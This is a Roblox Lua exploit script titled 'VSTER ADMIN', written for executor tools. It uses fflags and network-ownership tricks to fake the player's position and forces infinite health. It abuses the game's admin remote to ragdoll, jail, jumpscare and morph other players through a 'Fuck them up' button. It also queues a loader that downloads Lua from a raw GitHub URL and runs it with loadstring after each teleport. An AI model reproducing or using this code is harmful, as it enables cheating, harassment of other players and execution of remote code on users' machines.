local Players = game:GetService("Players")

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local PhysicsService = game:GetService("PhysicsService")
local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer
local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
local Humanoid = Character:WaitForChild("Humanoid")

local DESYNC_ENABLED = false
local FAKE_POSITION = nil
local UPDATE_INTERVAL = 0.5 
local lastUpdate = tick()
local OFFSET_RANGE = 4 
local DEBOUNCE = false
local LAST_F_PRESS = 0
local DOUBLE_PRESS_THRESHOLD = 0.3
local serverPosBox = nil

if Character then
    local humanoid = Character:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.MaxHealth = math.huge
        humanoid.Health = math.huge
        
        humanoid:GetPropertyChangedSignal("Health"):Connect(function()
            humanoid.Health = math.huge
        end)
    end
end

local function createServerPosBox()
    if serverPosBox then
        serverPosBox:Destroy()
    end
    
    serverPosBox = Instance.new("Part")
    serverPosBox.Name = "ServerPositionBox"
    serverPosBox.Size = Vector3.new(4, 5, 3)
    serverPosBox.Transparency = 0.7
    serverPosBox.Color = Color3.fromRGB(255, 0, 0)
    serverPosBox.Material = Enum.Material.Neon
    serverPosBox.CanCollide = false
    serverPosBox.Anchored = true
    serverPosBox.Parent = workspace
    
    local selectionBox = Instance.new("SelectionBox")
    selectionBox.Adornee = serverPosBox
    selectionBox.LineThickness = 0.05
    selectionBox.Color3 = Color3.fromRGB(255, 255, 0)
    selectionBox.Parent = serverPosBox
    
    local billboardGui = Instance.new("BillboardGui")
    billboardGui.Size = UDim2.new(0, 200, 0, 50)
    billboardGui.StudsOffset = Vector3.new(0, 3, 0)
    billboardGui.AlwaysOnTop = true
    billboardGui.Parent = serverPosBox
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = "WHERE OTHERS SEE YOU"
    textLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
    textLabel.TextScaled = true
    textLabel.Font = Enum.Font.GothamBold
    textLabel.TextStrokeTransparency = 0
    textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
    textLabel.Parent = billboardGui
end

local function updateServerPosBox()
    if DESYNC_ENABLED and HumanoidRootPart and FAKE_POSITION then
        if not serverPosBox then
            createServerPosBox()
        end
        
        serverPosBox.CFrame = FAKE_POSITION
        serverPosBox.Transparency = 0.5
    else
        if serverPosBox then
            serverPosBox.Transparency = 1
        end
    end
end

local function createBlurEffect()
    local blurEffect = Instance.new("BlurEffect")
    blurEffect.Name = "FlingBlur"
    blurEffect.Size = 0
    blurEffect.Parent = game:GetService("Lighting")
    return blurEffect
end

local blurEffect = createBlurEffect()

local function toggleSyncEffects(enabled)
    if enabled then
        local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local tween = TweenService:Create(blurEffect, tweenInfo, {Size = 50})
        tween:Play()
    else
        local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
        local tween = TweenService:Create(blurEffect, tweenInfo, {Size = 0})
        tween:Play()
    end
end

print("hello " .. LocalPlayer.DisplayName .. " if ur anti hit aint working anymore press the desync button or press f again ty")
print("TUTORIAL: just press the button then it should work IF IT DOSENT HERES AN TUTORIAL FOR PC NOT MOBILE IT SHOULD WORK IF U PRESS THE BUTTON IM SURE. PRESS F 2x if u dont wanna press the button then it should work too")

pcall(function()
    PhysicsService:RegisterCollisionGroup("NoCollide")
    PhysicsService:CollisionGroupSetCollidable("NoCollide", "Default", false)
end)

local function applyFFlags(enable)
    pcall(function()
        if enable then
            setfflag("WorldStepMax", "-1000000")
            setfflag("DFIntS2PhysicsSenderRate", "1")
            setfflag("DFIntAssemblyExtentsExpansionStudHundredth", "1000")
            setfflag("FFlagRakNetForceUseUnreliable", "True")
            setfflag("FFlagDebugDisableTelemetryV2Event", "True")
            setfflag("DFIntNetworkLatencyTolerance", "9999")
            setfflag("DFIntTaskSchedulerTargetFps", "1")
            setfflag("DFIntNetworkPhysicsSenderRate", "1")
            setfflag("DFIntNetworkPhysicsRate", "1")
            setfflag("DFIntCharacterCollisionUpdateRate", "1")
            setfflag("DFIntCharacterControllerUpdateRate", "1")
        else
            setfflag("WorldStepMax", "0")
            setfflag("DFIntS2PhysicsSenderRate", "60")
            setfflag("DFIntAssemblyExtentsExpansionStudHundredth", "0")
            setfflag("DFIntNetworkLatencyTolerance", "100")
            setfflag("DFIntTaskSchedulerTargetFps", "60")
            setfflag("DFIntNetworkPhysicsSenderRate", "60")
            setfflag("DFIntNetworkPhysicsRate", "60")
            setfflag("DFIntCharacterCollisionUpdateRate", "30")
            setfflag("DFIntCharacterControllerUpdateRate", "30")
        end
    end)
end

local function setClientOwnership()
    for _, part in pairs(Character:GetDescendants()) do
        if part:IsA("BasePart") then
            pcall(function()
                part:SetNetworkOwner(LocalPlayer)
                part.Anchored = false
                if DESYNC_ENABLED then
                    part.CollisionGroup = "NoCollide"
                    part.CanCollide = false
                else
                    part.CollisionGroup = "Default"
                    part.CanCollide = true
                end
            end)
        end
    end
    pcall(function()
        sethiddenproperty(LocalPlayer, "SimulationRadius", 99999)
    end)
end

local function initializeDesync()
    if HumanoidRootPart then
        FAKE_POSITION = HumanoidRootPart.CFrame
        setClientOwnership()
        applyFFlags(true)
        createServerPosBox()
    end
end

local function toggleDesync()
    DESYNC_ENABLED = not DESYNC_ENABLED
    if DESYNC_ENABLED then
        initializeDesync()
    else
        applyFFlags(false)
        setClientOwnership()
        if serverPosBox then
            serverPosBox:Destroy()
            serverPosBox = nil
        end
    end
end

local function fireQuantumTeleport()
    if not Character or not HumanoidRootPart then return end
    
    toggleSyncEffects(true)
    
    local Event = game:GetService("ReplicatedStorage").Packages.Net["RE/QuantumCloner/OnTeleport"]
    Event:FireServer()
    
    print("Fired QuantumCloner teleport event!")
    
    wait(0.3)
    
    toggleSyncEffects(false)
end

local function spamF()
    local Event = game:GetService("ReplicatedStorage").Packages.Net["RE/QuantumCloner/OnTeleport"]
    Event:FireServer()
    print("Fired QuantumCloner teleport event FIRST!")
    wait(0.5)
    
    for i = 1, 2 do
        if not DEBOUNCE then
            DEBOUNCE = true
            toggleDesync()
            wait(1)
            DEBOUNCE = false
        end
    end
end

local Remote = ReplicatedStorage
    :WaitForChild("Packages")
    :WaitForChild("Net")
    :WaitForChild("RE/AdminPanelService/ExecuteCommand")

local commands = {
    "ragdoll",
    "rocket",
    "balloon",
    "inverse",
    "nightvision",
    "jail",
    "tiny",
    "jumpscare",
    "morph"
}

local ADMIN_RAW_URL = "https://raw.githubusercontent.com/thetoaster97/99123/refs/heads/main/3.lua"

local function find_queue()
    if type(queue_on_teleport) == "function" then return queue_on_teleport end
    if syn and type(syn.queue_on_teleport) == "function" then return syn.queue_on_teleport end
    if secure_load and type(secure_load.queue_on_teleport) == "function" then return secure_load.queue_on_teleport end
    if KRNL and type(KRNL.queue_on_teleport) == "function" then return KRNL.queue_on_teleport end
    for k,v in pairs(_G) do
        if type(v) == "function" and tostring(k):lower():find("queue_on_teleport") then
            return v
        end
    end
    return nil
end

local queue_func = find_queue()

if queue_func and ADMIN_RAW_URL and ADMIN_RAW_URL ~= "" then
    local queued_payload = [[
local url = "]] .. ADMIN_RAW_URL .. [["
local function safeGet(u)
    if syn and type(syn.request) == "function" then
        local ok, res = pcall(function() return syn.request({Url = u, Method = "GET"}).Body end)
        if ok and res then return res end
    end
    if type(http_request) == "function" then
        local ok, res = pcall(function() return http_request({Url = u}).Body end)
        if ok and res then return res end
    end
    if type(request) == "function" then
        local ok, res = pcall(function() return request({Url = u}).Body end)
        if ok and res then return res end
    end
    if type(game.HttpGet) == "function" then
        local ok, res = pcall(function() return game:HttpGet(u) end)
        if ok and res then return res end
    end
    local HttpService = game:GetService("HttpService")
    local ok, res = pcall(function() return HttpService:GetAsync(u) end)
    if ok and res then return res end
    return nil
end

local code = safeGet(url)
if code then
    local fn = loadstring(code)
    if fn then pcall(fn) end
end
]]

    TeleportService.TeleportInitFailed:Connect(function()
        local ok, err = pcall(function() queue_func(queued_payload) end)
        if ok then
            print("[VSTER] Admin script queued for server hop.")
        else
            warn("[VSTER] Failed to queue payload:", err)
        end
    end)
    
    local LocalPlayer = Players.LocalPlayer
    local originalPlaceId = game.PlaceId
    
    LocalPlayer.OnTeleport:Connect(function(State)
        if State == Enum.TeleportState.Started then
            local ok, err = pcall(function() queue_func(queued_payload) end)
            if ok then
                print("[VSTER] Admin script queued for server hop.")
            else
                warn("[VSTER] Failed to queue payload:", err)
            end
        end
    end)
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PlayerEffectPanel"
ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

local desyncButton = Instance.new("TextButton")
desyncButton.Size = UDim2.new(0, 100, 0, 40)
desyncButton.Position = UDim2.new(0, 10, 0, 10)
desyncButton.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
desyncButton.Text = "START"
desyncButton.TextColor3 = Color3.fromRGB(255, 255, 255)
desyncButton.TextSize = 18
desyncButton.Font = Enum.Font.GothamBold
desyncButton.BorderSizePixel = 0
desyncButton.Parent = ScreenGui

local desyncCorner = Instance.new("UICorner")
desyncCorner.CornerRadius = UDim.new(0, 8)
desyncCorner.Parent = desyncButton

desyncButton.MouseButton1Click:Connect(function()
    spamF()
end)

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 280, 0, 375)
Frame.Position = UDim2.new(1, -290, 0.5, -187.5)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame.BackgroundTransparency = 0.1
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.Text = "VSTER ADMIN"
Title.TextColor3 = Color3.fromRGB(235, 225, 255)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.GothamBold
Title.TextSize = 22
Title.Parent = Frame

local Scrolling = Instance.new("ScrollingFrame")
Scrolling.Size = UDim2.new(1, 0, 1, -50)
Scrolling.Position = UDim2.new(0, 0, 0, 45)
Scrolling.CanvasSize = UDim2.new(0, 0, 0, 0)
Scrolling.ScrollBarThickness = 6
Scrolling.BackgroundTransparency = 1
Scrolling.Parent = Frame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, 6)
UIListLayout.Parent = Scrolling

local function createPlayerButton(player)
    local PlayerFrame = Instance.new("Frame")
    PlayerFrame.Size = UDim2.new(1, -10, 0, 35)
    PlayerFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    PlayerFrame.BorderSizePixel = 0
    PlayerFrame.Parent = Scrolling

    local NameLabel = Instance.new("TextLabel")
    NameLabel.Text = player.Name
    NameLabel.Size = UDim2.new(0.6, 0, 1, 0)
    NameLabel.Position = UDim2.new(0.05, 0, 0, 0)
    NameLabel.BackgroundTransparency = 1
    NameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    NameLabel.Font = Enum.Font.Gotham
    NameLabel.TextSize = 18
    NameLabel.TextXAlignment = Enum.TextXAlignment.Left
    NameLabel.Parent = PlayerFrame

    local Button = Instance.new("TextButton")
    Button.Text = "Fuck them up"
    Button.Size = UDim2.new(0.4, 0, 0.8, 0)
    Button.Position = UDim2.new(0.55, 0, 0.1, 0)
    Button.BackgroundColor3 = Color3.fromRGB(60, 130, 255)
    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
    Button.Font = Enum.Font.GothamBold
    Button.TextSize = 16
    Button.AutoButtonColor = true
    Button.Parent = PlayerFrame

    Button.MouseButton1Click:Connect(function()
        for _, command in ipairs(commands) do
            local args = {
                player,
                command
            }
            Remote:FireServer(unpack(args))
            task.wait(0.15)
        end
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    if player ~= Players.LocalPlayer then
        createPlayerButton(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    createPlayerButton(player)
end)

Players.PlayerRemoving:Connect(function(player)
    for _, child in ipairs(Scrolling:GetChildren()) do
        if child:IsA("Frame") then
            local label = child:FindFirstChildOfClass("TextLabel")
            if label and label.Text == player.Name then
                child:Destroy()
            end
        end
    end
end)

RunService.RenderStepped:Connect(function()
    if not DESYNC_ENABLED or not Character or not HumanoidRootPart then return end
    Humanoid:ChangeState(Enum.HumanoidStateType.Running)
    Humanoid.PlatformStand = false
    for _, part in pairs(Character:GetChildren()) do
        if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
            part.CFrame = HumanoidRootPart.CFrame * CFrame.new(
                math.random(-OFFSET_RANGE, OFFSET_RANGE),
                math.random(-0.5, 0.5),
                math.random(-OFFSET_RANGE, OFFSET_RANGE)
            )
        end
    end
    
    updateServerPosBox()
end)

RunService.Heartbeat:Connect(function()
    if not DESYNC_ENABLED or not Character or not HumanoidRootPart or not FAKE_POSITION then return end
    if tick() - lastUpdate >= UPDATE_INTERVAL then
        pcall(function()
            local moveOffset = Humanoid.MoveDirection * 0.2
            local randomOffset = Vector3.new(
                math.random(-OFFSET_RANGE/2, OFFSET_RANGE/2),
                0,
                math.random(-OFFSET_RANGE/2, OFFSET_RANGE/2)
            )
            FAKE_POSITION = FAKE_POSITION * CFrame.new(moveOffset + randomOffset)
            HumanoidRootPart.CFrame = FAKE_POSITION
        end)
        lastUpdate = tick()
    end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed or DEBOUNCE or input.KeyCode ~= Enum.KeyCode.F then return end
    
    local currentTime = tick()
    
    if currentTime - LAST_F_PRESS <= DOUBLE_PRESS_THRESHOLD then
        if not DEBOUNCE then
            DEBOUNCE = true
            fireQuantumTeleport()
            wait(0.5)
            DEBOUNCE = false
        end
    else
        if not DEBOUNCE then
            DEBOUNCE = true
            toggleDesync()
            wait(0.3)
            DEBOUNCE = false
        end
    end
    
    LAST_F_PRESS = currentTime
end)

LocalPlayer.CharacterAdded:Connect(function(newChar)
    Character = newChar
    HumanoidRootPart = newChar:WaitForChild("HumanoidRootPart")
    Humanoid = newChar:WaitForChild("Humanoid")
    
    if Humanoid then
        Humanoid.MaxHealth = math.huge
        Humanoid.Health = math.huge
        
        Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
            Humanoid.Health = math.huge
        end)
    end
    
    if DESYNC_ENABLED then
        wait(1)
        initializeDesync()
    end
end)

game:GetService("Lighting").ChildRemoved:Connect(function(child)
    if child.Name == "FlingBlur" then
        blurEffect = createBlurEffect()
    end
end)